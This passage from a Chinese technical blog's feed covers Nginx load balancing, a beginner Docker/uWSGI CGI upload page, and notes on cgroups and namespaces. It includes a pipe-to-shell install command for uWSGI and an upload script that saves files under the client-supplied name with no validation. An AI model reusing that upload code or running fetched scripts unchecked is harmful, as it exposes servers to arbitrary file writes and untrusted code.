class="number">127.0.0.1:8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这里一个point 是 <strong>七层均衡</strong> 还是 <strong>四层均衡</strong>。这里的层指的是在协议栈中的层级 ，OSI 的七层结构，其中的七层均衡指的就是在应用层实现的（HTTP），四层就是在传输层（tcp）。</p><p>这里的配置段是存在于 stream 的不是在 Http中。</p><hr><p>这里本来有个突然很荒谬的想法：能不能使用 server_name 用来对不同的 <strong>referer</strong> 进行都不同端口的转发。</p><p>（事实上，当然可以通过虚拟主机，在同一个端口上，通过 server_name 字段来解析到不同的端口，配置如下）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> baidu&#123; </span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:8081</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="attribute">upstream</span> google &#123; </span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:8082</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123; </span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>; </span><br><span class="line">    <span class="attribute">server_name</span> www.baidu.cn baidu.cn;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   Host             <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Real-IP        <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123; </span><br><span class="line">        <span class="attribute">proxy_pass</span> http://baidu; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123; </span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>; </span><br><span class="line">    <span class="attribute">server_name</span> www.google.cn google.cn;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   Host             <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Real-IP        <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://google; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以，实现在同一端口的来自已不同站点的请求，分配到各自不同的 server。</p><hr><p>当时就想，能不能 我的 Frp 连接也可以实现这样的域名绑定呢？当时有点懵，显然回答是不行的。</p><p>回到<strong>Domain Name</strong> 的解析原理，最终是在 Dns server 解析成为真实的 IP 。在进行 HTTP 的forward 的时候，其源站实际上是包含在 HTTP 的请求包里面的，所以，Nginx 可以对其不同的源站解析的不同的端口。</p><p>那么这里回到前面 的情况，如果是使用了nginx 来对一个 tcp 连接进行分发。可能实现吗？</p><p>不可能，因为，根本无法获得源站的地址呀。这里就是问题所在了。</p><h2 id="关于-Nginx-LB-的配置"><a href="#关于-Nginx-LB-的配置" class="headerlink" title="关于 Nginx LB 的配置"></a>关于 Nginx LB 的配置</h2><p>这里就顺便，巩固一下 LB 的相关配置：</p><h3 id="Nginx-的-LB-类型"><a href="#Nginx-的-LB-类型" class="headerlink" title="Nginx 的 LB 类型"></a>Nginx 的 LB 类型</h3><p><strong>nginx 的 upstream目前支持 4 种方式的分配</strong> 引用自（<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWljcm90aWdlci9wLzc2MjM4NTguaHRtbO+8iQ==" title="https://www.cnblogs.com/microtiger/p/7623858.html）">https://www.cnblogs.com/microtiger/p/7623858.html）<i class="fa fa-external-link"></i></span></p><ol><li>轮询（默认） </li></ol><p>　　每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，<strong>能自动剔除</strong>。 </p><ol><li>weight </li></ol><p>　　指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 </p><ol><li>ip_hash </li></ol><p>　　每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。  </p><ol><li>fair（第三方） </li></ol><p>　　按后端服务器的响应时间来分配请求，响应时间短的优先分配。  <strong>这个感觉不错，后面可以试试</strong></p><ol><li>url_hash（第三方）</li></ol><hr><p>ip_hash是容易理解的，但是因为仅仅能用ip这个因子来分配后端，因此ip_hash是有缺陷的，不能在一些情况下使用：</p><p>nginx不是最前端的服务器。ip_hash要求nginx一定是最前端的服务器，否则nginx得不到正确ip，就不能根据ip作hash。譬如使用的是squid为最前端，那么nginx取ip时只能得到squid的服务器ip地址，用这个地址来作分流是肯定错乱的。</p><p>这里就最好使用 Url_hash 的方式，根据 不同的 Url 进行分流。</p><hr><p>不过这里又有了一个严重的问题 ：<strong>Session 和 Cookie</strong>，这里直接贴出文章。本来想总结一下 ， 已经有写好的了，自己也学习一下</p><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2hpeWFuZ3h0L2FydGljbGVzLzEzMDU1MDYuaHRtbA==" title="https://www.cnblogs.com/shiyangxt/articles/1305506.html">cookie 和session 的区别详解<i class="fa fa-external-link"></i></span></p></blockquote><p>cookie 和session 的区别：</p><ol><li><p><strong>cookie数据存放在客户的浏览器上，session数据放在服务器上</strong></p></li><li><p>cookie不是很安全，<strong>别人可以分析存放在本地的COOKIE</strong>并进行COOKIE欺骗考虑到安全应当使用session。</p><p>httpOnly ：JS 无法读取到 cookie</p></li><li><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用COOKIE。</p></li><li><p>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p><p><strong>这里比较好玩， 可以将 Cookie 设置为 大于 4096 的kv，这样的话，将会直接导致 客户端的 Deny</strong></p></li><li><p>所以个人建议：</p><p>将登陆信息等重要信息存放为SESSION （存在 Session 注入的问题？）<br>其他信息如果需要保留，可以放在COOKIE中</p></li></ol><h2 id="知识树"><a href="#知识树" class="headerlink" title="知识树"></a>知识树</h2><p>这个比较好玩， 以后每次类似的 blog 的时候就加上 吧，做个自己的思路方向的记录：</p><ul><li>nginx 的 LB<ul><li>通过 域名 的TCP 转发可行性</li><li>nginx 的 LB 的种类<ul><li>IP_hash 的问题</li><li>URL_hash 的 session问题<ul><li>session和Cookie<ul><li>httpOnly</li></ul></li></ul></li></ul></li></ul></li></ul><hr>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/01/20/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88LB%20%E5%92%8C%20Tunnel%EF%BC%89/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Docker 初步</title>
      <link>https://www.diglp.xyz/2019/01/08/OP_Docker_proj/</link>
      <guid>https://www.diglp.xyz/2019/01/08/OP_Docker_proj/</guid>
      <pubDate>Mon, 07 Jan 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这篇，是一个Docker
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这篇，是一个Docker 的实战篇，使用Docker实现一个文件上传的web页面。ps：本来是要实现上传后自动编译并且允许返回结果的。因为各种原因就烂尾了，就这样吧先。</p><p>因为这篇，是比较基础的操作，很多东西还是有悖了Docker的 <strong>Build，ship，and run</strong> 的思想。这里还需要进行手动，所以显得比较有悖初衷。不过做一个过程的记录还是可以的。</p><hr><p>后面就打算实现一个标标准准的Docker 的工程，体现出 <strong>微服务</strong> 的思想。</p><blockquote><p>Docker 的一个容器理应是只跑一个进程（服务）的。</p></blockquote><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>先从Dockerhub上拉镜像，这里需要 Nginx 和 Uwsgi，这里选取了<span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3RpYW5nb2xvL3V3c2dpLW5naW54" title="https://hub.docker.com/r/tiangolo/uwsgi-nginx">tiangolo/uwsgi-nginx<i class="fa fa-external-link"></i></span> 这个镜像。 </p><p>在启动镜像的时候使用交互模式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 80:80 --name test2 docker.io/tiangolo/uwsgi-nginx:latest /bin/sh</span><br></pre></td></tr></table></figure><p>这个时候，Dockerfile 里面的CMD命令将会被重载为后面的 <code>/bin/sh</code></p><p>在交互模式下，attach 了容器之后，可以使用 <code>ctrl+p，ctrl+q</code> 组合键进行 detach</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker attach bf00008eee04</span><br><span class="line">docker attach test2</span><br></pre></td></tr></table></figure><hr><p>创建挂载卷容器，在对应的环境 编译 uwsgi， 之后可以之间拷贝到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -tdi -v /tmp/tttmm/:/tmp/mm --name share docker.io/tiangolo/uwsgi-nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><p>这里使用 bash 好用得多。另外这里附上 uwsgi 的CGI版本的一键编译的script：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://uwsgi.it/install | bash -s cgi /tmp/uwsgi</span><br></pre></td></tr></table></figure><hr><h2 id="CGI-部署"><a href="#CGI-部署" class="headerlink" title="CGI 部署"></a>CGI 部署</h2><p>跑一个综合的容器， 有端口映射以及卷挂载功能：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -tdi -p 80:80 -v /tmp/tttmm/:/tmp/mm --name share docker.io/tiangolo/uwsgi-nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><p>由于 镜像自带的uwsgi 的版本是app的，其没有编译 CGI 功能。所以在这里需要进行替换。之间在容器内使用上述命令进行编译。对 <code>/usr/local/bin/uwsgi</code> 进行替换，对配置文件进行修改</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">socket</span> = /tmp/uwsgi.sock</span><br><span class="line"><span class="attr">chown-socket</span> = nginx:nginx</span><br><span class="line"><span class="attr">chmod-socket</span> = <span class="number">664</span></span><br><span class="line"><span class="attr">hook-master-start</span> = unix_signal:<span class="number">15</span> gracefully_kill_them_allroot@<span class="number">251</span>a2c8dc0b2:/usr/local/bin#</span><br></pre></td></tr></table></figure><p>这里是用户自定义的：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">plugins</span> = cgi</span><br><span class="line"><span class="attr">cgi</span> = /app</span><br><span class="line"><span class="attr">cgi-allowed-ext</span> = .py</span><br><span class="line"><span class="attr">cgi-helper</span> = .py=python</span><br></pre></td></tr></table></figure><p>指定CGI根目录，以及对应的后缀文件的解析器。后面再修改Nginx配置即可。</p><hr><p>编写实例 CGI 脚本。使用其标准输出作为页面内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Content-Type: text/html"</span>)</span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;First CGI server Base on Docker&lt;/h2&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;p&gt;Hello ann&lt;/p&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;p&gt;cause you are my world XD&lt;/p&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure><hr><p>至此，启动 <code>/usr/bin/supervisord</code> 便可以启动相关进程</p><blockquote><p>Supervisor (<span class="exturl" data-url="aHR0cDovL3N1cGVydmlzb3JkLm9yZy8=" title="http://supervisord.org/">http://supervisord.org<i class="fa fa-external-link"></i></span>) 是一个用 Python 写的进程管理工具，可以很方便的用来启动、重启、关闭进程（不仅仅是 Python 进程）。除了对单个进程的控制，还可以同时启动、关闭多个进程，比如很不幸的服务器出问题导致所有应用程序都被杀死，此时可以用 supervisor 同时启动所有应用程序而不是一个一个地敲命令启动。</p></blockquote><p>在客户端使用 浏览器请求便可以得到返回结果</p><hr><h2 id="Post-文件以及编译执行"><a href="#Post-文件以及编译执行" class="headerlink" title="Post 文件以及编译执行"></a>Post 文件以及编译执行</h2><p>前面实现了一个简单的CGI, 后面开始完善整个功能，实现文件的POST 上传以及在线的编译。</p><p>先需要对 Nginx 配置进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /app/html;# 这里是页面的目录</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /cgi-bin &#123;</span><br><span class="line">        root /app/cgi-bin;# cgi 的目录</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启 Nginx 的服务，使其配置生效，测试 页面 以及 CGI 脚本。</p><p>这里先构建文件的上传入口，简易的上传 页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>update<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>UploadPoint<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"upload-form"</span> <span class="attr">action</span>=<span class="string">"/cgi-bin/upload.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> &gt;</span></span><br><span class="line">        　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"upload"</span> <span class="attr">name</span>=<span class="string">"upload"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以及后端的实现文件保存以及编译的功能</p><p>下面是CGI代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb </span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage() </span><br><span class="line">fileitem = form[<span class="string">'upload'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> fileitem.filename:</span><br><span class="line">    print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;meta charset=\"utf-8\"&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;title&gt;succeed&lt;/title&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;h2&gt; 输入的内容是：%s&lt;/h2&gt;"</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'tmpfile/'</span> + fileitem.filename, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(fileitem.file.read())</span><br><span class="line">        print(<span class="string">'&lt;p&gt;文件已保存&lt;/p&gt;'</span>)</span><br><span class="line">    print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    text_content = <span class="string">"没有内容"</span></span><br><span class="line">    print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;meta charset=\"utf-8\"&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;title&gt;failed&lt;/title&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;h2&gt; 输入的内容是：%s&lt;/h2&gt;"</span> % text_content)</span><br><span class="line">    print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly91d3NnaS1kb2NzLXpoLnJlYWR0aGVkb2NzLmlvL3poX0NOL2xhdGVzdC9DR0kuaHRtbA==" title="https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/CGI.html">在uWSGI上运行CGI脚本<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2xpeWFuZ2xpYW5nLm1lL3Bvc3RzLzIwMTUvMDYvdXNpbmctc3VwZXJ2aXNvci8=" title="http://liyangliang.me/posts/2015/06/using-supervisor/">使用 supervisor 管理进程<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3RpYW5nb2xvL3V3c2dpLW5naW54" title="https://hub.docker.com/r/tiangolo/uwsgi-nginx">镜像地址 tiangolo/uwsgi-nginx<i class="fa fa-external-link"></i></span></li></ul>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/01/08/OP_Docker_proj/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《Docker 进阶与实践》</title>
      <link>https://www.diglp.xyz/2018/12/31/Book_Docker%E8%BF%9B%E9%98%B6%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
      <guid>https://www.diglp.xyz/2018/12/31/Book_Docker%E8%BF%9B%E9%98%B6%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
      <pubDate>Sun, 30 Dec 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：Docker 进阶与实践</li><li>作者：华为Docker实践小组</li><li>ISBN：9787111523390</li></ul><hr><p>这本书作为一个 对 Docker 的系统的学习和了解，由理论到实践，讲解了Docker 技术，以及其应用。</p><p>粗浅阅读，作为对Docker 了解，准备一个简单的project。（在线编译器？）</p><h2 id="Docker-简介"><a href="#Docker-简介" class="headerlink" title="Docker 简介"></a>Docker 简介</h2><p>其核心的思想是 ： <strong>Build Ship and Run</strong>。 </p><p>在磁盘占用，性能以及效率都在传统的虚拟化技术上有了明显的提高。</p><ul><li><p>Docker 之于传统的虚拟化技术是没有 Hypervisor 层。</p></li><li><p>Docker 使用了层级镜像的应用，可以实现存储空间的复用。</p></li></ul><hr><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul><li><p>Docker 客户端</p><p>使用 command 发起请求，或者使用 RESTful API 进行请求</p></li><li><p>Docker deamon</p><p>整个Docker 的核芯引擎，可以理解为 Docker Server。</p></li><li><p>Docker 容器</p><p>容器是一个核心内容，很好的诠释了集装箱的概念，可以实现一个标准隔离执行环境。</p><p>迁移和部署的时候，不用关心容器里面是装了什么，也不需要了解是怎么配置。整个就是一个一切完整的集装箱。 </p></li><li><p>Docker 镜像</p><p>可以理解为 容器是镜像的实例， 镜像是容器的模板。</p></li><li><p>Registry</p><p>可以理解为镜像站点，可以直接使用 pull 从其拉去镜像。</p></li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在内核编译的阶段，需要开启 <code>Cgroup</code> 以及 <code>Namespace</code>的编译选项。</p><h3 id="Docker-的基本使用"><a href="#Docker-的基本使用" class="headerlink" title="Docker 的基本使用"></a>Docker 的基本使用</h3><p>直接键入docker 会得到其提示页面， 使用 <code>docker COMMAND --help</code>可以直接显示相关的帮助页面</p><h2 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h2><p>在社区的合作下形成了Cgroup 以及 namespace 。</p><ul><li>Mount Namespace</li><li>UTS Namespace</li><li>IPC Namespace</li><li>PID Namespace</li><li>Net Namespace</li><li>User Namespace</li></ul><hr><p>Cgroup :</p><ul><li>cpuset</li><li>CPU</li><li>memory</li><li>device</li><li>freezer</li><li>blkio</li></ul><hr><h3 id="容器组成"><a href="#容器组成" class="headerlink" title="容器组成"></a>容器组成</h3><p>容器技术通过 Cgroup 和 Namespace 为核心技术。在其基础上由了根文件系统，以及容器引擎。书中有以下公式：</p><blockquote><p><code>容器 = cgroup + namespace + rootfs + 容器引擎(用户态工具)</code></p></blockquote><ul><li>Cgroup: 资源控制</li><li>Namespace: 访问隔离</li><li>rootfs： 文件系统隔离</li><li>容器引擎: 生命周期控制</li></ul><h3 id="容器的创建"><a href="#容器的创建" class="headerlink" title="容器的创建"></a>容器的创建</h3><p>书中的这里使用了三段伪代码，来说明一个容器的构成，这里说下自己的理解。</p><ol><li><p>通过系统的clone调用，来传入各个的Namespace的Clone flag，对其命名空间进行拷贝 ，之后得到一个新的进程，这个进程就会拥有一个属于自己的 clone 的Namespace。</p></li><li><p><code>echo $pid &gt; /sys/fs/cgroup/cpu/tesks</code> 建立的进程的PID 写入了各个 Cgroup的子系统之中，受到相应的Cgroup的子系统控制。</p></li><li>通过 系统调用，使得进程可以进入一个 新的 rootfs ，之后使用 <code>exec(&quot;/bin/bash&quot;)</code> 来启动一个 shell。</li></ol><p>这样就完成了一个容器的创建</p><hr><h3 id="Cgroup"><a href="#Cgroup" class="headerlink" title="Cgroup"></a>Cgroup</h3><p><strong>Cgroup 的目的就是实现了对与系统资源的<code>QoS</code></strong></p><p>在CG 之前，通过 sched_setaffinity 设定一个进程的CPU 亲和性（nginx中的配置）。</p><blockquote><p><code>$$</code> 表示当前进程的PID</p></blockquote><p>用户可以甚至可以新建自己的 Cgroup的规则，系统默认的规则在 <code>/sys/fs/cgroup</code> 下面进行配置</p><p>对进程配置生效，只需要将pid 写入以下文件 ： <code>/sys/fs/cgroup/pids</code>  这样是整个的 Cgroup 规则对当前进程生效。</p><p>或者，可以直接配置独立项目里面的 xxx.procs 。</p><p>blkio子系统        可以对块设备的I/O带宽进行限制。</p><p>devices子系统     可以对设备的权限进行控制 <code>a *.* rmw</code> 代表所有设备可被访问 <code>c 1:3 r</code> 控制 主设备号:子设备号设备 只读</p><h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><p>将内核的全局资源做封装，每一个NS 都有其独立的资源拷贝。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/$$/ns</span><br></pre></td></tr></table></figure><p>查看当前的进程的namespace。</p><p>可以很容易的使用 系统调用建立一个独立的namespace的进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">stack</span>[STACK_SIZE];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="keyword">const</span> child_args[] = &#123;<span class="string">"/bin/bash"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">child</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  execv(<span class="string">"/bin/bash"</span>, child_args);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  pid = clone(child, <span class="built_in">stack</span>+STACK_SIZE, SIGCHLD|CLONE_NEWUTS, <span class="literal">NULL</span>);<span class="comment">// 这里配置克隆命名空间的操作</span></span><br><span class="line">  waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接 GCC 编译， 在返回的SHELL 里，对hostname 进行修改 ，logout 之后，原shell中的hostname并没有被改变。</p><p>如前面提到的，namespace 有几个种类，</p><table><thead><tr><th>type</th><th>desc</th></tr></thead><tbody><tr><td>UTS</td><td>struct utsname ，uname 系统调用里面的结构体</td></tr><tr><td>IPC</td><td>进程间通信的隔离，如消息队列？ ipcmk</td></tr><tr><td>PID</td><td>PID 